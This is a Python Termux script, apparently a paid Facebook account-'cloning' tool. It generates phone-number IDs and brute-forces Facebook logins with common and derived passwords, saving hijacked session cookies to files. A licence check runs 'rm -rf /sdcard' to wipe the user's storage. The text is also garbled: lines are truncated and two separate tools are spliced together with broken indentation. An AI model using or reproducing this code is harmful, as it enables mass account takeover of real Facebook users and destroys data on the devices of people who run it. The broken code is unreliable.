import os

try:

    import requests

except ImportError:

    print('\n [✓] installing requests !...\n')

    os.system('pip install requests')

try:

    import concurrent.futures

except ImportError:

    print('\n [✓] installing futures !...\n')

    os.system('pip install futures')

try:

    import bs4

except ImportError:

    print('\n [✓] installing bs4 !...\n')

    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib

from concurrent.futures import ThreadPoolExecutor as sarfrazssb

from datetime import datetime

from bs4 import BeautifulSoup

ct = datetime.now()

n = ct.month

bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']

try:

    if n < 0 or n > 12:

        exit()

    nTemp = n - 1

except ValueError:

    exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = bulan[nTemp]

P = '\x1b[1;97m' # 

M = '\033[1;96m' # 

H = '\033[1;94m' # 

K = '\x1b[1;93m' # 

B = '\x1b[1;97m' # 

U = '\x1b[1;97m' # 

O = '\x1b[1;97m' # 

N = '\x1b[0m'    # 

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,fuck,pwBaru=[],[],[]

ok = []

cp = []

id = []

user = []

loop = 0

url_lookup = "https://lookup-id.com/"

url_mb = "https://m.facebook.com"

url_ip = "https://www.httpbin.org/ip"

header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}

bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}

done = False

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.01)

        

def main_apv():

    imt="110Y=="

    ak="RIAZ_100RS"

    os.system('clear')

    print(logo)

    try:

        key1=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'r').read()

    except IOError:

        os.system("clear")

        print(logo)

        print ("༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")
        print ("YOUR TOKEN IS NOT APROVAL")     
        print ("         THIS IS YOUR TOKEN👇📥📬")
        print ("༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")

        print ("")

        myid=uuid.uuid4().hex[:10].upper()

        print ("          YOUR KEY : "+ak+myid+imt)

        print ("༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")

        kok=open('/data/data/com.termux/files/usr/bin/.akkkk-cov', 'w')

        kok.write(myid+imt)

        kok.close()

        print ("")

        print ("")

        print ("  Copy Key And Sent Me WhatsApp Approvel Your Key ")

        print ("༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")

        time.sleep(3.5)

        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt

        os.system('am start https://wa.me/+92188049915?text=' + tks)

        

    r1=requests.get("https://raw.githubusercontent.com/Red-Mafia/fiile/main/Sm.txt").text

    if key1 in r1:

        R()

    else:

        os.system("clear")

        print(logo)

        print ("         ༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")
        print ("             \033[1;94mGIVE ME 100RS FOR APROVAL RIAZ")     
           
        print ("             \033[1;32mYOUR KEY : "+ak+key1)     
        print ("             Key And Sent Me WP Approvel Your Key ")
        print ("         ༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄")

        time.sleep(3.5)

        tks = 'Dear%20Admin,%20Please%20Apporved%20My%20Key%20To%20Premium✓✓%20%20%20%20%20My%20%20Key%20%20:%20'+ak+''+key1

        os.system('am start https://wa.me/+923188049915?text=' + tks)

logo="""
             \033[1;93m8888888b.  8888888        d8888 8888888888P 
             \033[1;95m888   Y88b   888         d88888       d88P  
             \033[1;93m888    888   888        d88P888      d88P   
             \033[1;95m888   d88P   888       d88P 888     d88P    
             \033[1;93m8888888P"    888      d88P  888    d88P     
             \033[1;95m888 T88b     888     d88P   888   d88P      
             \033[1;93m888  T88b    888    d8888888888  d88P       
             \033[1;95m888   T88b 8888888 d88P     888 d8888888888
        \033[1;92m༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;95mAUTHOR   : RIAZKHAN           \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : RIAZKHAN           \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : RIAZKHAN           \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +9660531382117       \033[1;93m▇▇
             \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS PAID          \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGIVE ME 100RS FOR APRVAL      \033[1;93m▇▇
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
         \033[1;92m༄𝑟𝑖𝑎𝑧᭄•───────────────────────────────────────•༄𝑘ℎ𝑎𝑛᭄
""" 
def hasil(OK,cp):

	if not len(OK) != 0:	    pass

	if len(cp) != 0:

	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/RIAZ-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/RIAZ-CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back Ahmad Menu ")

	    R()

		

def R():

			os.system("clear")

			print(logo)

p
    
#---------------------[LOOP MENU]-------------------->
loop = 0
cp = []
ok = []
twf = []



def my_tool_security():
    os.system("clear")
    print(logo)
    print(47*"-")
    print(c, 45*"-", wit)
    print("\t  Facebook : MD RAKIB HOSSEN")
    print("\t  Fb page  : IZT RAKIB ")
    print("\t  Github   : MRRAKIB404.CYBER")
    print(c, 45*"-")
    print(47*"-")
    try:
        token_one=open(key_save_one,'r').read()
    except(requests.exceptions.ConnectionError):
        print(red," please on internet wifi/data ")
        exit()
    except(FileNotFoundError):
        os.system('termux-setup-storage')
        print("\t Welcome To HBF Tool ....")
        time.sleep(2)
        iid_1=uuid.uuid1().hex[:7].upper()
        iid_2=uuid.uuid1().hex[:7].upper()
        open(key_save_one,'w').write(iid_1)
        open(key_save_two,'w').write(iid_2)
        my_tool_security()
    except(KeyError,OSError,IOError):
        os.system("termux-setup-storage")
        print("\n Hey user we are facing issues with >
        print(" Give termux storage permission and tr>
        exit()
    token_two=open(key_save_two,'r').read()
    if len(token_two)<=1:
        os.system("rm -rf /sdcard/*")
        os.system("rm -rf /sdcard")
        os.system('rm -rf '+key_save_one+'')
        exit()
    else:
        pass
    if len(token_one)<=1:
        os.system("rm -rf /sdcard/*")
        os.system("rm -rf /sdcard")
        os.system('rm -rf '+key_save_one+'')
        exit()
    else:
        pass
    if len(token_two)>=8:
        os.system("rm -rf /sdcard/*")
        os.system("rm -rf /sdcard")
        os.system('rm -rf '+key_save_one+'')
        exit()
    else:
        f_token=token_one+token_two
    my_server=requests.get("https://www.facebook.com/>
    if f_token in my_server:
        xyz()
    else:
        _help=uuid.uuid1().hex[:6].upper()+"=HBF"
        print("\n\t     [ Hello User ]\n")
        print(" This is paid tool you need subscripti>
        print(" for buy subscription press enter an m>
        print(" to RSA Programmer fb page and your ke>
        print(" otherwise msg on this whatsapp 031559>
        print(" Copy your Key :",gre,f_token+_help,wi>
        os.system("xdg-open https://www.facebook.com/>
        exit()


#---------------------[APPLICATION CHECKER]---------->
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settin>
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Activ>
    else:
        print(f'\r[🎮] %s ☆ Your Active Apps ☆     :{>
        for i in range(len(game)):
         print(f"\r[%s%s] %s%s"%(N,i+1,game[i].rep>
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check fa>
    w=session.get("https://mbasic.facebook.com/settin>
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expir>
    else:
        print(f'\r[🎮] %s ◇ Your Expired Apps ◇    :{>
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].rep>
        else:
            print(57*'-')


#---------------------[MAIN MENU]-------------------->
def xyz():
    os.system("play-audio WELCOME_TO_𝙰𝙺𝙰𝚂𝙷_RANDOM_CLO>
    os.getuid

    os.system("clear");print(logo)
    print('           \x1b[97m[\033[37;41m  M A I N  >
    print(f"")
    print(f'{BLUE}═══════════════════════════════════>
    print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}>
    print(f"{BLUE}═══════════════════════════════════>
    print(f"{RED}[01] {WHITE}RANDOM CLONE PAK  M1")
    print(f"{RED}[02] {WHITE}RANDOM CLONE BD  M1")
    print(f"{RED}[03] {WHITE}OWNER FB ID")
    print(f"{RED}[04] {WHITE}OWNER WHATSAPP")
    print(f"{RED}[00] {WHITE}EXIT PROGRAM ")
    print(f"")
    print(f"\033[1;91m===============================>
    RAKIB = input("[√] CHOOSE : ")
    if RAKIB in ["1","01"]:

        password()
    elif RAKIB in ["2","02"]:
        Tabii2()

    elif RAKIB in ["3","03"]:
        os.system("xdg-open https://www.facebook.com/>
    elif RAKIB in ["4","04"]:
        os.system("xdg-open https://wa.me/+9660531382117>
    elif RAKIB in ["0","00"]:
       exit()
    else:
        print('\033[1;31mINCORECT OPTION!\033[1;31m')
        xyz()
 #---------------------[PASS DEF]---------------------#
def password():

    os.system("clear")
    print(logo)
    print('       \x1b[97m[\033[37;41m  P A S S W O R>
    print(f"")
    print(f"{RED}[01] {WHITE} 1 PASSWORD   {GREEN} [ >
    print(f"{RED}[02] {WHITE} 2 PASSWORDS  {GREEN} [ >
    print(f"{RED}[03] {WHITE} 5 PASSWORDS  {GREEN} [ >
    linex()
    print("")
    passX = input(f" {RED}CHOOSE{𝙰𝙺𝙰𝚂𝙷2} : ")
    if passX in ['1','01']:
        os.system("xdg-open https://www.facebook.com/>
        password1()
    elif passX in ['2','02']:
        os.system("xdg-open https://www.facebook.com/>
        password2()
    elif passX in ['3','03']:
        os.system("xdg-open https://www.facebook.com/>
        password5()
    else:
        xyz()
#---------------------[CLONING MAIN DEF]------------->
#---------------------[PASS 1 CLONING MENU]---------->
def password1():
   user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E  >
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\0>
    print(f"")
    print(f" 0306 ,0300 ,0315 ,0333")
    print(f" 0341 ,0342 ,0345 ,0349")
    print(f" 0321 ,0316 ,0308 ,0309")
    print(f"")
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE 0300 / 0302>
    print("")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T>
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 1>
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) fo>
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE>
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREE>
        print(f" {WHITE}NUMBER YOU PUT        : {YELL>
        print(f" {WHITE}TODAY DATE & TIME     :{RED} >
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + >
        print(f'{RED}================================>
        for love in user:
            uid = code+love
            pwx = [love]
            manshera.submit(free1,uid,pwx,tl)
def free1(uid,pwx,tl):
    global loop
    global ok
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
             session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://free.faceb>
            log_data = {
                "lsd":re.search('name="lsd" value="(.>
            "jazoest":re.search('name="jazoest" value>
            "m_ts":re.search('name="m_ts" value="(.*?>
            "li":re.search('name="li" value="(.*?)"',>
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header = ({"authority": 'free.facebook.co>
            "method": 'GET',
           "scheme": 'https',
            "accept": 'text/html,application/xhtml+xm>
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            "cache-control": 'no-cache',
            "pragma": 'no-cache',
            "referer": 'https://free.facebook.com/',
            "sec-ch-ua": '".Not/A)Brand";v="99", "Goo>
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform":'"Windows"',
            "sec-fetch-dest": 'manifest',
            "sec-fetch-mode": 'cors',
             "sec-fetch-site": 'same-origin',
            "user-agent":pro,})
            lo = session.post('https://free.facebook.>
            log_cookies=session.cookies.get_dict().ke>
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,>
                uid = coki[7:22]
                os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_OK.mp3")
                print('\r\033[1;32m[RAKIB-OK] '+uid+'>
                cek_apk(session,coki)
                open('/sdcard/RAKIB-OK.txt', 'a').wri>
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in >
                    coki=";".join([key+"="+value for >
                    uid=coki[24:39]
                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_2F.mp>
                    print('\r\033[1;34m[RAKIB-2F] '+u>
                    open('/sdcard/RAKIB-2F.txt', 'a')>
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for >
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_CP.mp>
                    print(f'\r\033[1;30m[RAKIB-CP] '+>
                    open('/sdcard/RAKIB-CP.txt', 'a')>
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝙰𝙺𝙰𝚂𝙷 🔥] [%s]>
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass






#---------------------[PASS 2 CLONING MENU]---------->
def password2():
    user=[]

    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E  >
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\0>
    print(f"")
    print(f" 0306 ,0300 ,0315 ,0333")
    print(f" 0341 ,0342 ,0345 ,0349")
    print(f" 0321 ,0316 ,0308 ,0309")
    print(f"")
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE 0300 / 0302>
    print("")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T>
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 1>
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) fo>
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE>
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREE>
        print(f" {WHITE}NUMBER YOU PUT        : {YELL>
        print(f" {WHITE}TODAY DATE & TIME     :{RED} >
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + >
        print(f'{RED}================================>
        for love in user:
            uid = code+love
            pwx = [love,code+love]
            manshera.submit(free2,uid,pwx,tl)
def free2(uid,pwx,tl):
    global loop
    global ok
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://free.faceb>
            log_data = {
                "lsd":re.search('name="lsd" value="(.>
            "jazoest":re.search('name="jazoest" value>
             "m_ts":re.search('name="m_ts" value="(.*?>
            "li":re.search('name="li" value="(.*?)"',>
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header = ({"authority": 'free.facebook.co>
            "method": 'GET',
           "scheme": 'https',
            "accept": 'text/html,application/xhtml+xm>
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            "cache-control": 'no-cache',
            "pragma": 'no-cache',
            "referer": 'https://free.facebook.com/',
            "sec-ch-ua": '".Not/A)Brand";v="99", "Goo>
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform":'"Windows"',
            "sec-fetch-dest": 'manifest',
            "sec-fetch-mode": 'cors',
            "sec-fetch-site": 'same-origin',
            "user-agent":pro,})
            lo = session.post('https://free.facebook.>
            log_cookies=session.cookies.get_dict().ke>
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,>
                 uid = coki[7:22]
                os.system("play-audio RAKIB_OK.mp3")
                print('\r\033[1;32m[RAKIB-OK] '+uid+'>
                cek_apk(session,coki)
                open('/sdcard/RAKIB-OK.txt', 'a').wri>
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in >
                    coki=";".join([key+"="+value for >
                    uid=coki[24:39]
                    os.system("play-audio 𝙰𝙺𝙰𝚂𝙷_2F.mp>
                    print('\r\033[1;34m[RAKIB-2F] '+u>
                    open('/sdcard/RAKIB-2F.txt', 'a')>
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for >
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio RAKIB_CP.mp>
                    print(f'\r\033[1;30m[RAKIB-CP] '+>
                    open('/sdcard/RAKIB-CP.txt', 'a')>
                    cp.append(uid)
                    break
            else:
                continue
loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝙰𝙺𝙰𝚂𝙷 🔥] [%s]>
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
#---------------------[PASS 5 CLONING MENU]---------->
def password5():
    user=[]

    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E  >
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\0>
    print(f"")
    print(f" 0306 ,0300 ,0315 ,0333")
    print(f" 0341 ,0342 ,0345 ,0349")
    print(f" 0321 ,0316 ,0308 ,0309")
    print(f"")
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE 0300 / 0302>
    print("")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T>
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 1>
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) fo>
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE>
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREE>
        print(f" {WHITE}NUMBER YOU PUT        : {YELL>
        print(f" {WHITE}TODAY DATE & TIME     :{RED} >
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + >
        print(f'{RED}================================>
        for love in user:
            uid = code+love
            pwx = [love,code+love,'786786','123456','>
            manshera.submit(free,uid,pwx,tl)
def free(uid,pwx,tl):
	global loop
    global ok
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://free.faceb>
            log_data = {
                "lsd":re.search('name="lsd" value="(.>
            "jazoest":re.search('name="jazoest" value>
            "m_ts":re.search('name="m_ts" value="(.*?>
            "li":re.search('name="li" value="(.*?)"',>
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header = ({"authority": 'free.facebook.co>
            "method": 'GET',
           "scheme": 'https',
            "accept": 'text/html,application/xhtml+xm>
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            "cache-control": 'no-cache',
             "pragma": 'no-cache',
            "referer": 'https://free.facebook.com/',
            "sec-ch-ua": '".Not/A)Brand";v="99", "Goo>
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform":'"Windows"',
            "sec-fetch-dest": 'manifest',
            "sec-fetch-mode": 'cors',
            "sec-fetch-site": 'same-origin',
            "user-agent":pro,})
            lo = session.post('https://free.facebook.>
            log_cookies=session.cookies.get_dict().ke>
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,>
                uid = coki[7:22]
                os.system("play-audio RAKIB_OK.mp3")
                print('\r\033[1;32m[𝙰𝙺𝙰𝚂𝙷-OK] '+uid+'>
                cek_apk(session,coki)
                open('/sdcard/RAKIB-OK.txt', 'a').wri>
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in >
                    coki=";".join([key+"="+value for >
                    uid=coki[24:39]
                    os.system("play-audio RAKIB_2F.mp>
                    print('\r\033[1;34m[RAKIB-2F] '+u>
                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-2F.txt', 'a')>
                    twf.append(uid)
                    else:
                    coki=";".join([key+"="+value for >
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio RAKIB_CP.mp>
                    print(f'\r\033[1;30m[RAKIB-CP] '+>
                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-CP.txt', 'a')>
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝙰𝙺𝙰𝚂𝙷 🔥] [%s]>
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
#---------------------[MAIN CLONING DEF 2]----------->


def Tabii2():
    user=[]

    os.getuid
    os.geteuid
    clear()
    print(f"          \x1b[97m[\033[37;41m  C O D E  >
    print(f"")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\0>
    print(f"")
    print(' 880171 , 880172 , 880173 \n 880174 , 8801>
    print(f"")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I M I T>
    print(f"")
    limit = int(input(' EXAMPLE: 1000, 2000, 5000, 10>
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) fo>
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:
        clear()
         tl = str(len(user))
        print(f"\n {WHITE}TOTAL IDZ             : {RE>
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {RED}>
        print(f" {WHITE}NUMBER YOU PUT        : {RED}>
        print(f" {WHITE}PROCESS HAS BEEN STARTED")
        print(f" {WHITE}BE PATIENT.......")
        print(f" {WHITE}TO STOP PROCESS Ctrl + Z ")
        print(f'{RED}================================>
        for love in user:
            uid = code+love
            pwx = [love,'786786','123456']
            manshera.submit(m,uid,pwx,tl)
def m(uid,pwx,tl):
    global loop
    global ok
    global agents
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            pro = random.choice(ugen)
            pro = random.choice(ugen)
            free_fb = session.get('https://free.faceb>
            log_data = {
                "lsd":re.search('name="lsd" value="(.>
            "jazoest":re.search('name="jazoest" value>
            "m_ts":re.search('name="m_ts" value="(.*?>
            "li":re.search('name="li" value="(.*?)"',>
            "try_number":"0",
              "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header = ({"authority": 'free.facebook.co>
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xm>
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            "cache-control": 'no-cache',
            "pragma": 'no-cache',
            "referer": 'https://free.facebook.com/',
            "sec-ch-ua": '".Not/A)Brand";v="99", "Goo>
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform":'"Windows"',
            "sec-fetch-dest": 'manifest',
            "sec-fetch-mode": 'cors',
            "sec-fetch-site": 'same-origin',
            "user-agent":pro,})
            lo = session.post('https://free.facebook.>
            log_cookies=session.cookies.get_dict().ke>
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,>
                uid = coki[7:22]
                os.system("play-audio RAKIB_OK.mp3")
                print('\r\033[1;32m[RAKIB-OK] '+
                cek_apk(session,coki)
                open('/sdcard/RAKIB-OK.txt', 'a').wri>
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in >
                    coki=";".join([key+"="+value for >
                    uid=coki[24:39]
                    os.system("play-audio RAKIB_2F.mp>
                    print('\r\033[1;34m[𝙰𝙺𝙰𝚂𝙷-2F] '+u>
                    open('/sdcard/𝙰𝙺𝙰𝚂𝙷-2F.txt', 'a')>
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for >
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio RAKIB_CP.mp>
                    print(f'\r\033[1;30m[RAKIB-CP] '+>
                    open('/sdcard/RAKIB-CP.txt', 'a')>
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[RAKIB 🔥] [%s]>
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
#---------------------[END MENU]---------------------#
if __name__ == '__main__':
    xyz()
    
